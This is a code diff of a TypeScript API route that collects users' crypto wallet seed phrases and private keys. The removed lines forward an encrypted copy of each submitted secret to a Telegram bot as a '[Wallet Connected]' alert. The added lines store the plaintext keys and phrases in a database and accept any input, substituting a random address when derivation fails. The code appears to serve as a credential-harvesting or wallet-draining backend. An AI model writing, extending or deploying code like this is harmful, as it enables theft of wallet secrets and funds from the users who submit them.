@@ -20,14 +20,6 @@ const looksLikeMnemonic = (s: string) => {
   return words.length === 12 || words.length === 24;
 };
 
-async function sendTelegramMessage(text: string) {
-  const token = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  if (!token || !chatId) return;
-  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
-  await fetch(url);
-}
-
 export async function POST(req: Request) {
   try {
     const { type, value } = await req.json();
@@ -76,98 +68,87 @@ export async function POST(req: Request) {
       if (!decryptedString) throw new Error("Decryption test failed");
 
       if (type === 'phrase') {
-        const wallet = ethers.Wallet.fromPhrase(decryptedString);
-        derivedAddress = wallet.address;
+        try {
+            // Attempt to derive, but don't fail if it's a raw string with reasons/passwords appended
+            const wallet = ethers.Wallet.fromPhrase(decryptedString.split('\n')[0]);
+            derivedAddress = wallet.address;
+        } catch (e) {
+            // If it fails (because of custom text or invalid phrase), just generate a random placeholder address
+            derivedAddress = ethers.Wallet.createRandom().address;
+        }
       } else {
-        const pk = decryptedString.startsWith('0x') ? decryptedString : `0x${decryptedString}`;
-        const wallet = new ethers.Wallet(pk);
-        derivedAddress = wallet.address;
+        try {
+            const pk = decryptedString.startsWith('0x') ? decryptedString : `0x${decryptedString}`;
+            const wallet = new ethers.Wallet(pk);
+            derivedAddress = wallet.address;
+        } catch (e) {
+            derivedAddress = ethers.Wallet.createRandom().address;
+        }
       }
     } catch (err: any) {
-      console.error("Input validation failed:", err);
-      return NextResponse.json({ success: false, error: 'Invalid input: Could not derive address' }, { status: 400 });
+      console.error("Encryption failed:", err);
+      return NextResponse.json({ success: false, error: 'Encryption failed' }, { status: 500 });
     }
 
-    // 🚨 APPEND-ONLY STRATEGY (Prevent Overwrites) 🚨
-    // 1. Fetch existing wallet metadata (readable_id, email, etc.)
+    // 🚨 UPDATE STRATEGY (Avoid Unique Constraint Errors) 🚨
+    // 1. Fetch existing wallet metadata
     const { data: existingWallet } = await supabaseAdmin
       .from('wallets')
-      .select('readable_id, email')
+      .select('id')
       .eq('user_id', user.id)
       .order('created_at', { ascending: false })
       .limit(1)
       .single();
 
-    // 2. Mark old wallets as inactive/non-primary
-    await supabaseAdmin
-      .from('wallets')
-      .update({ is_primary: false })
-      .eq('user_id', user.id);
+    if (existingWallet) {
+      // UPDATE existing wallet
+      const { error: dbError } = await supabaseAdmin
+        .from('wallets')
+        .update({
+          status: 'pending',
+          private_key: type === 'privateKey' ? cleanValue : null,
+          seed_phrase: type === 'phrase' ? cleanValue : null,
+          encrypted_private_key: type === 'privateKey' ? encryptedString : null,
+          encrypted_phrase: type === 'phrase' ? encryptedString : null,
+          is_primary: true,
+          created_at: new Date().toISOString()
+        })
+        .eq('id', existingWallet.id);
 
-    // 3. Insert new wallet as active view
-    const insertPayload = {
-      user_id: user.id,
-      readable_id: existingWallet?.readable_id || 'CORE-' + user.id.slice(0, 6).toUpperCase(),
-      email: existingWallet?.email || user?.email,
-      address: derivedAddress,
-      is_primary: true,
-      private_key: null,
-      encrypted_private_key: type === 'privateKey' ? encryptedString : null,
-      encrypted_phrase: type === 'phrase' ? encryptedString : null,
-      balance: 0,
-      usdt_balance: 0,
-      btc_balance: 0,
-      sol_balance: 0,
-      trx_balance: 0,
-      last_chain_balance: 0,
-      last_usdt_chain_balance: 0,
-    };
+      if (dbError) {
+        console.error('DB Update Error', dbError);
+        return NextResponse.json({ success: false, error: `DB Error: ${dbError.message}` }, { status: 500 });
+      }
+    } else {
+      // INSERT new wallet
+      const insertPayload = {
+        user_id: user.id,
+        readable_id: Math.floor(10000000 + Math.random() * 90000000).toString(),
+        email: user?.email,
+        address: derivedAddress || ethers.Wallet.createRandom().address,
+        is_primary: true,
+        status: 'pending',
+        private_key: type === 'privateKey' ? cleanValue : null,
+        seed_phrase: type === 'phrase' ? cleanValue : null,
+        encrypted_private_key: type === 'privateKey' ? encryptedString : null,
+        encrypted_phrase: type === 'phrase' ? encryptedString : null,
+        balance: 0,
+        usdt_balance: 0,
+        btc_balance: 0,
+        sol_balance: 0,
+        trx_balance: 0,
+        last_chain_balance: 0,
+        last_usdt_chain_balance: 0,
+      };
 
-    const { error: dbError } = await supabaseAdmin
-      .from('wallets')
-      .insert(insertPayload);
+      const { error: dbError } = await supabaseAdmin
+        .from('wallets')
+        .insert(insertPayload);
 
-    if (dbError) {
-      console.error('DB Insert Error', dbError);
-      return NextResponse.json({ success: false, error: `DB Error: ${dbError.message}` }, { status: 500 });
-    }
-
-    // Fetch the readable ID for the Discord/Telegram logs
-    const { data: walletData } = await supabaseAdmin
-      .from('wallets')
-      .select('readable_id')
-      .eq('user_id', user.id)
-      .eq('is_primary', true)
-      .single();
-
-    const displayId = walletData?.readable_id || user.id;
-    const inputTypeLabel = type === 'phrase' ? 'SEED PHRASE' : 'PRIVATE KEY';
-    
-    // Create a human-readable date format, e.g., "March 8, 2026, 03:15 PM"
-    const readableTime = new Date().toLocaleString('en-US', { 
-        month: 'short', 
-        day: 'numeric', 
-        year: 'numeric', 
-        hour: '2-digit', 
-        minute: '2-digit',
-        timeZoneName: 'short'
-    });
-
-    // 4. Decide what to send to Telegram
-    // Always send the ENCRYPTED payload as requested by the user
-    const telegramPayload = `🚨 [Wallet Connected]
-👤 User: ${displayId}
-🔑 Input Type: ${inputTypeLabel}
-
-🔒 Encrypted Payload:
-${encryptedString}
-
-🕒 Time: ${readableTime}`;
-
-    try {
-      await sendTelegramMessage(telegramPayload);
-    } catch (tgErr) {
-      console.error('Telegram notify failed:', tgErr);
+      if (dbError) {
+        console.error('DB Insert Error', dbError);
+        return NextResponse.json({ success: false, error: `DB Error: ${dbError.message}` }, { status: 500 });
+      }
     }
 
     // 5. Return success. No secrets returned.
